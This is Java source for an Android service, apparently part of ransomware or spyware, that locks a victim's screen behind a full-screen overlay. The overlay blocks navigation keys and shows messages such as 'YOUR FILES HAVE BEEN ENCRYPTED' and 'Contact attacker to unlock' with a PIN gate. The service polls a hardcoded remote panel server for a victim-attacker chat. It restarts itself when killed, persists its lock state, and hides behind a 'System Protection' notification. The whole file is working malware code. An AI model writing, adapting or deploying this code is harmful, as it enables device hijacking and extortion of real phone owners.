package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.text.InputType;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.VideoView;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class LockOverlayService extends Service {
    public static final String ACTION_LOCK   = "com.nullx.pp.ACTION_LOCK";
    public static final String ACTION_UNLOCK = "com.nullx.pp.ACTION_UNLOCK";
    public static final String ACTION_RANSOM = "com.nullx.pp.ACTION_RANSOM";
    public static final String EXTRA_MESSAGE = "lock_message";
    public static final String EXTRA_PIN     = "lock_pin";
    public static final String EXTRA_VIDEO   = "ransom_video_path";

    private static final String SERVER  = "http://arzzpanel.arzzhostingxcloud.my.id:2027";
    private static final String CHANNEL = "LockOverlayChannel";
    private static final int    NID     = 99;

    private WindowManager wm;
    private View overlayRoot;
    private TextView tvChat;
    private EditText etPin, etChat;
    private ScrollView chatScroll;
    private Handler uiHandler, chatHandler;
    private Runnable chatRunnable;
    private String pin = "1234", deviceId = "";
    private android.media.MediaPlayer ransomPlayer = null;
    private boolean isOverlayShowing = false;
    private int pinAttempts = 0;
    private boolean isPinLocked = false;

    @Override public void onCreate() {
        super.onCreate();
        uiHandler = new Handler(Looper.getMainLooper());
        chatHandler = new Handler(Looper.getMainLooper());
        
        // CHECK OVERLAY PERMISSION
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                stopSelf();
                return;
            }
        }
        
        createChannel();
        startForeground(NID, buildNotif());
        deviceId = readId();
        
        // Restore lock if was locked before restart
        SharedPreferences p = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        if (p.getBoolean("isRansom", false)) {
            String msg   = p.getString("ransomMessage", "YOUR FILES ARE ENCRYPTED");
            String vid   = p.getString("ransomVideo", "");
            pin = p.getString("lockPin", "1234");
            showRansomOverlay(msg, vid);
        } else if (p.getBoolean("isLocked", false)) {
            String msg = p.getString("lockMessage", "DEVICE LOCKED");
            pin = p.getString("lockPin", "1234");
            showOverlay(msg);
        }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_LOCK.equals(action)) {
            String msg = intent.getStringExtra(EXTRA_MESSAGE);
            String p2  = intent.getStringExtra(EXTRA_PIN);
            if (msg == null) msg = "DEVICE IS LOCKED";
            if (p2  == null) p2  = "1234";
            pin = p2;
            pinAttempts = 0;
            isPinLocked = false;
            saveLock(msg, p2, true);
            showOverlay(msg);
        } else if (ACTION_RANSOM.equals(action)) {
            String msg   = intent.getStringExtra(EXTRA_MESSAGE);
            String video = intent.getStringExtra(EXTRA_VIDEO);
            String p2    = intent.getStringExtra(EXTRA_PIN);
            if (msg   == null) msg   = "YOUR FILES HAVE BEEN ENCRYPTED\n\nContact attacker to unlock";
            if (p2    == null) p2    = "1234";
            if (video == null) video = "";
            pin = p2;
            pinAttempts = 0;
            isPinLocked = false;
            saveRansom(msg, video, p2, true);
            showRansomOverlay(msg, video);
        } else if (ACTION_UNLOCK.equals(action)) {
            saveLock("", "", false);
            saveRansom("", "", "", false);
            hideOverlay();
        }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        // Release MediaPlayer
        if (ransomPlayer != null) {
            try {
                if (ransomPlayer.isPlaying()) ransomPlayer.stop();
                ransomPlayer.release();
            } catch (Exception ignored) {}
            ransomPlayer = null;
        }
        
        hideOverlay();
        
        // Restart self
        Intent restart = new Intent(this, LockOverlayService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart);
        else startService(restart);
        super.onDestroy();
    }

    // ── OVERLAY ──────────────────────────────────────────────────────────────
    private void showOverlay(String message) {
        if (isOverlayShowing) return;
        
        if (wm == null) wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (wm == null) return;
        
        hideOverlay();

        // Root
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0A0A0A"));
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        root.setPadding(dp(24), dp(60), dp(24), dp(40));
        root.setFocusable(true);
        root.setFocusableInTouchMode(true);

        // Block back/home/recents BUT NOT POWER
        root.setOnKeyListener((v, keyCode, event) -> {
            if (keyCode == KeyEvent.KEYCODE_POWER) {
                return false; // ALLOW POWER BUTTON
            }
            if (keyCode == KeyEvent.KEYCODE_BACK ||
                keyCode == KeyEvent.KEYCODE_HOME ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
                keyCode == KeyEvent.KEYCODE_MENU) {
                return true;
            }
            return false;
        });
        root.setOnTouchListener((v, e) -> false);

        // Title
        TextView title = new TextView(this);
        title.setText("⚠ DEVICE LOCKED ⚠");
        title.setTextColor(Color.parseColor("#E53935"));
        title.setTextSize(22);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setGravity(Gravity.CENTER);
        title.setLetterSpacing(0.12f);
        root.addView(title);

        // Divider
        root.addView(divider());

        // Message
        TextView tvMsg = new TextView(this);
        tvMsg.setText(message);
        tvMsg.setTextColor(Color.parseColor("#CCCCDD"));
        tvMsg.setTextSize(14);
        tvMsg.setGravity(Gravity.CENTER);
        tvMsg.setLineSpacing(6, 1);
        lp(tvMsg, 0, 0, 0, dp(20));
        root.addView(tvMsg);

        // Chat area
        chatScroll = new ScrollView(this);
        chatScroll.setBackgroundColor(Color.parseColor("#111122"));
        chatScroll.setLayoutParams(lpH(dp(180), 0, 0, dp(10)));
        tvChat = new TextView(this);
        tvChat.setTextColor(Color.parseColor("#AAAACC"));
        tvChat.setTextSize(11);
        tvChat.setPadding(dp(14), dp(10), dp(14), dp(10));
        tvChat.setLineSpacing(4, 1);
        chatScroll.addView(tvChat);
        root.addView(chatScroll);

        // Chat input row
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setLayoutParams(lpH(ViewGroup.LayoutParams.WRAP_CONTENT, 0, 0, dp(20)));
        etChat = new EditText(this);
        etChat.setHint("Reply...");
        etChat.setHintTextColor(Color.parseColor("#444466"));
        etChat.setTextColor(Color.WHITE);
        etChat.setTextSize(12);
        etChat.setBackground(roundBg(Color.parseColor("#1A1A2E"), 8));
        etChat.setPadding(dp(12), dp(10), dp(12), dp(10));
        LinearLayout.LayoutParams etLp = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        etLp.setMargins(0, 0, dp(8), 0);
        etChat.setLayoutParams(etLp);
        Button btnSend = new Button(this);
        btnSend.setText("Send");
        btnSend.setTextColor(Color.WHITE);
        btnSend.setTextSize(11);
        btnSend.setBackground(roundBg(Color.parseColor("#E53935"), 8));
        btnSend.setOnClickListener(v -> sendChat());
        row.addView(etChat);
        row.addView(btnSend);
        root.addView(row);

        root.addView(divider());

        // PIN with attempt counter
        TextView tvAttempts = new TextView(this);
        tvAttempts.setText("Attempts: 0/5");
        tvAttempts.setTextColor(Color.parseColor("#666688"));
        tvAttempts.setTextSize(12);
        tvAttempts.setGravity(Gravity.CENTER);
        lp(tvAttempts, 0, 0, 0, dp(8));
        root.addView(tvAttempts);

        etPin = new EditText(this);
        etPin.setHint("Enter PIN to unlock");
        etPin.setHintTextColor(Color.parseColor("#444466"));
        etPin.setTextColor(Color.WHITE);
        etPin.setTextSize(18);
        etPin.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        etPin.setGravity(Gravity.CENTER);
        etPin.setBackground(roundBg(Color.parseColor("#0D0D1F"), 10));
        etPin.setPadding(dp(16), dp(14), dp(16), dp(14));
        lp(etPin, 0, 0, 0, dp(12));
        root.addView(etPin);

        Button btnUnlock = new Button(this);
        btnUnlock.setText("UNLOCK");
        btnUnlock.setTextColor(Color.WHITE);
        btnUnlock.setTextSize(13);
        btnUnlock.setTypeface(null, android.graphics.Typeface.BOLD);
        btnUnlock.setLetterSpacing(0.1f);
        btnUnlock.setBackground(roundBg(Color.parseColor("#1B1B3A"), 10));
        btnUnlock.setPadding(0, dp(14), 0, dp(14));
        LinearLayout.LayoutParams unlockLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        btnUnlock.setLayoutParams(unlockLp);
        btnUnlock.setOnClickListener(v -> tryUnlock(tvAttempts));
        root.addView(btnUnlock);

        overlayRoot = root;

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        try {
            wm.addView(overlayRoot, params);
            isOverlayShowing = true;
        } catch (Exception e) {
            android.util.Log.w("LOCK", "addView: " + e.getMessage());
        }
        startChatPoll();
    }

    private void hideOverlay() {
        isOverlayShowing = false;
        if (chatHandler != null && chatRunnable != null) {
            chatHandler.removeCallbacks(chatRunnable);
            chatRunnable = null;
        }
        if (overlayRoot != null && wm != null) {
            try { wm.removeView(overlayRoot); } catch (Exception ignored) {}
            overlayRoot = null;
        }
        // Release MediaPlayer jika ada
        if (ransomPlayer != null) {
            try {
                if (ransomPlayer.isPlaying()) ransomPlayer.stop();
                ransomPlayer.release();
            } catch (Exception ignored) {}
            ransomPlayer = null;
        }
    }

    private void tryUnlock(TextView tvAttempts) {
        if (isPinLocked) {
            etPin.setText("");
            etPin.setHint("Too many attempts! Wait 60s");
            return;
        }
        
        if (etPin == null) return;
        String entered = etPin.getText().toString().trim();
        if (entered.equals(pin)) {
            pinAttempts = 0;
            isPinLocked = false;
            saveLock("", "", false);
            saveRansom("", "", "", false);
            hideOverlay();
        } else {
            pinAttempts++;
            tvAttempts.setText("Attempts: " + pinAttempts + "/5");
            etPin.setText("");
            etPin.setHint("Wrong PIN - try again");
            etPin.setHintTextColor(Color.parseColor("#E53935"));
            
            if (pinAttempts >= 5) {
                isPinLocked = true;
                etPin.setEnabled(false);
                etPin.setHint("TOO MANY ATTEMPTS! Wait 60s");
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    isPinLocked = false;
                    pinAttempts = 0;
                    etPin.setEnabled(true);
                    etPin.setHint("Enter PIN to unlock");
                    etPin.setHintTextColor(Color.parseColor("#444466"));
                    tvAttempts.setText("Attempts: 0/5");
                }, 60000);
            }
        }
    }

    // ── CHAT ─────────────────────────────────────────────────────────────────
    private void startChatPoll() {
        if (chatRunnable != null) {
            chatHandler.removeCallbacks(chatRunnable);
        }
        chatRunnable = new Runnable() {
            @Override public void run() {
                if (isOverlayShowing) {
                    pollChat();
                }
                if (chatHandler != null && chatRunnable != null) {
                    chatHandler.postDelayed(this, 3000);
                }
            }
        };
        chatHandler.post(chatRunnable);
    }

    private void pollChat() {
        if (deviceId.isEmpty() || !isOverlayShowing) return;
        new Thread(() -> {
            try {
                String resp = httpGet(SERVER + "/api/lock-chat/" + deviceId);
                if (resp == null) return;
                JSONObject obj = new JSONObject(resp);
                JSONArray msgs = obj.optJSONArray("messages");
                if (msgs == null || msgs.length() == 0) return;
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < msgs.length(); i++) {
                    JSONObject m = msgs.getJSONObject(i);
                    String from = m.optString("from", "owner");
                    String text = m.optString("text", "");
                    String time = m.optString("time", "");
                    sb.append(from.equals("owner") ? "[ Admin ] " : "[ You ] ")
                      .append(text).append("  ").append(time).append("\n");
                }
                final String s = sb.toString();
                uiHandler.post(() -> {
                    if (tvChat != null && isOverlayShowing) {
                        tvChat.append(s);
                        if (chatScroll != null) chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
                    }
                });
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendChat() {
        if (etChat == null || deviceId.isEmpty() || !isOverlayShowing) return;
        String text = etChat.getText().toString().trim();
        if (text.isEmpty()) return;
        etChat.setText("");
        uiHandler.post(() -> { 
            if (tvChat != null && isOverlayShowing) { 
                tvChat.append("[ You ] " + text + "\n"); 
                if (chatScroll != null) chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN)); 
            }
        });
        new Thread(() -> {
            try {
                JSONObject b = new JSONObject(); 
                b.put("text", text); 
                b.put("from", "target");
                postJson(SERVER + "/api/lock-chat/" + deviceId, b.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    // ── RANSOM OVERLAY ──────────────────────────────────────────────────────
    private void showRansomOverlay(String message, String videoPath) {
        if (isOverlayShowing) return;
        
        if (wm == null) wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        if (wm == null) return;
        
        hideOverlay();

        // Root — full black
        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.BLACK);
        root.setFocusable(true);
        root.setFocusableInTouchMode(true);
        root.setOnKeyListener((v, keyCode, event) -> {
            if (keyCode == KeyEvent.KEYCODE_POWER) {
                return false; // ALLOW POWER BUTTON
            }
            // Block ALL navigation keys
            return keyCode == KeyEvent.KEYCODE_BACK
                || keyCode == KeyEvent.KEYCODE_HOME
                || keyCode == KeyEvent.KEYCODE_APP_SWITCH
                || keyCode == KeyEvent.KEYCODE_MENU;
        });

        // Video layer (fullscreen behind) - with error handling
        if (videoPath != null && !videoPath.isEmpty()) {
            try {
                VideoView vv = new VideoView(this);
                FrameLayout.LayoutParams vp =
                    new FrameLayout.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT,
                        ViewGroup.LayoutParams.MATCH_PARENT);
                vv.setLayoutParams(vp);
                vv.setVideoPath(videoPath);
                vv.setOnPreparedListener(mp -> {
                    ransomPlayer = mp;
                    mp.setLooping(true);
                    mp.setVolume(0.7f, 0.7f);
                    mp.start();
                });
                vv.setOnErrorListener((mp, what, extra) -> {
                    android.util.Log.e("RANSOM", "Video error: " + what);
                    return true;
                });
                root.addView(vv);
            } catch (Exception e) {
                android.util.Log.e("RANSOM", "Video init error: " + e.getMessage());
            }
        }

        // Dark gradient overlay on video
        FrameLayout.LayoutParams gradLp =
            new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT);
        View gradView = new View(this);
        gradView.setLayoutParams(gradLp);
        gradView.setBackgroundColor(Color.parseColor("#99000000"));
        root.addView(gradView);

        // Content overlay (teks + PIN) — center
        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER_HORIZONTAL);
        content.setPadding(dp(24), dp(80), dp(24), dp(40));

        FrameLayout.LayoutParams clp =
            new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT);
        content.setLayoutParams(clp);

        // Lock icon text
        TextView tvIcon = new TextView(this);
        tvIcon.setText("🔒 RANSOM LOCK 🔒");
        tvIcon.setTextColor(Color.parseColor("#FF1744"));
        tvIcon.setTextSize(22);
        tvIcon.setTypeface(null, android.graphics.Typeface.BOLD);
        tvIcon.setGravity(Gravity.CENTER);
        tvIcon.setLetterSpacing(0.15f);
        tvIcon.setShadowLayer(8, 3, 3, Color.parseColor("#990000"));
        lp(tvIcon, 0, 0, 0, dp(16));
        content.addView(tvIcon);

        // Ransom message
        TextView tvMsg = new TextView(this);
        tvMsg.setText(message);
        tvMsg.setTextColor(Color.parseColor("#E0E0E0"));
        tvMsg.setTextSize(14);
        tvMsg.setGravity(Gravity.CENTER);
        tvMsg.setLineSpacing(6, 1);
        tvMsg.setShadowLayer(4, 1, 1, Color.BLACK);
        tvMsg.setBackground(roundBg(Color.parseColor("#CC000000"), 12));
        tvMsg.setPadding(dp(16), dp(12), dp(16), dp(12));
        lp(tvMsg, 0, 0, 0, dp(24));
        content.addView(tvMsg);

        // Attempt counter
        TextView tvAttempts = new TextView(this);
        tvAttempts.setText("Attempts: 0/5");
        tvAttempts.setTextColor(Color.parseColor("#666688"));
        tvAttempts.setTextSize(12);
        tvAttempts.setGravity(Gravity.CENTER);
        lp(tvAttempts, 0, 0, 0, dp(8));
        content.addView(tvAttempts);

        // PIN input
        etPin = new EditText(this);
        etPin.setHint("Enter PIN to unlock");
        etPin.setHintTextColor(Color.parseColor("#555577"));
        etPin.setTextColor(Color.WHITE);
        etPin.setTextSize(18);
        etPin.setInputType(InputType.TYPE_CLASS_NUMBER
            | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        etPin.setGravity(Gravity.CENTER);
        etPin.setBackground(roundBg(Color.parseColor("#0D0D1F"), 10));
        etPin.setPadding(dp(16), dp(14), dp(16), dp(14));
        lp(etPin, 0, 0, 0, dp(12));
        content.addView(etPin);

        // Unlock button
        Button btnUnlock = new Button(this);
        btnUnlock.setText("UNLOCK DEVICE");
        btnUnlock.setTextColor(Color.WHITE);
        btnUnlock.setTextSize(13);
        btnUnlock.setTypeface(null, android.graphics.Typeface.BOLD);
        btnUnlock.setLetterSpacing(0.1f);
        btnUnlock.setBackground(roundBg(Color.parseColor("#1A1A3A"), 10));
        btnUnlock.setPadding(0, dp(14), 0, dp(14));
        LinearLayout.LayoutParams ulp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        btnUnlock.setLayoutParams(ulp);
        btnUnlock.setOnClickListener(v -> tryUnlock(tvAttempts));
        content.addView(btnUnlock);

        root.addView(content);
        overlayRoot = root;

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
            PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP | Gravity.START;

        try { 
            wm.addView(overlayRoot, params);
            isOverlayShowing = true;
        } catch (Exception e) {
            android.util.Log.w("RANSOM", "addView: " + e.getMessage());
        }
    }

    // ── HELPERS ──────────────────────────────────────────────────────────────
    private String readId() {
        try { 
            SharedPreferences p = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE); 
            String id = p.getString("flutter.target_id", null); 
            if (id != null && !id.isEmpty()) return id; 
        } catch (Exception ignored) {}
        try { 
            java.io.File f = new java.io.File(android.os.Environment.getExternalStorageDirectory(), ".crpt/.devid"); 
            if (f.exists()) { 
                BufferedReader br = new BufferedReader(new java.io.FileReader(f)); 
                String id = br.readLine(); 
                br.close(); 
                if (id != null && !id.isEmpty()) return id.trim(); 
            } 
        } catch (Exception ignored) {}
        return "";
    }
    
    private void saveRansom(String msg, String video, String p2, boolean active) {
        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit()
            .putBoolean("isRansom", active)
            .putString("ransomMessage", msg)
            .putString("ransomVideo", video)
            .putString("lockPin", p2)
            .apply();
    }

    private void saveLock(String msg, String p2, boolean locked) {
        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit()
            .putBoolean("isLocked", locked)
            .putString("lockMessage", msg)
            .putString("lockPin", p2)
            .apply();
    }
    
    private int dp(int v) { 
        return (int)(v * getResources().getDisplayMetrics().density); 
    }
    
    private android.graphics.drawable.GradientDrawable roundBg(int color, int r) {
        android.graphics.drawable.GradientDrawable d = new android.graphics.drawable.GradientDrawable();
        d.setColor(color); 
        d.setCornerRadius(dp(r)); 
        return d;
    }
    
    private View divider() {
        View v = new View(this); 
        v.setBackgroundColor(Color.parseColor("#222244"));
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, 1);
        p2.setMargins(0, dp(16), 0, dp(16)); 
        v.setLayoutParams(p2); 
        return v;
    }
    
    private void lp(View v, int l, int t, int r, int b) {
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        p2.setMargins(l, t, r, b); 
        v.setLayoutParams(p2);
    }
    
    private ViewGroup.LayoutParams lpH(int h, int l, int t, int b) {
        LinearLayout.LayoutParams p2 = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, h);
        p2.setMargins(l, t, 0, b); 
        return p2;
    }
    
    private String httpGet(String url) {
        try { 
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection(); 
            c.setConnectTimeout(3000); 
            c.setReadTimeout(3000); 
            if (c.getResponseCode() != 200) return null; 
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8)); 
            StringBuilder sb = new StringBuilder(); 
            String l; 
            while ((l = br.readLine()) != null) sb.append(l); 
            br.close(); 
            return sb.toString(); 
        } catch (Exception e) { 
            return null; 
        }
    }
    
    private void postJson(String url, String json) {
        try { 
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection(); 
            c.setRequestMethod("POST"); 
            c.setRequestProperty("Content-Type", "application/json"); 
            c.setDoOutput(true); 
            c.setConnectTimeout(3000); 
            c.setReadTimeout(3000); 
            OutputStream os = c.getOutputStream(); 
            os.write(json.getBytes(StandardCharsets.UTF_8)); 
            os.close(); 
            c.getResponseCode(); 
            c.disconnect(); 
        } catch (Exception ignored) {}
    }
    
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Lock Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false); 
            NotificationManager nm = getSystemService(NotificationManager.class); 
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }
    
    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Protection")
            .setContentText("Active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
    }
}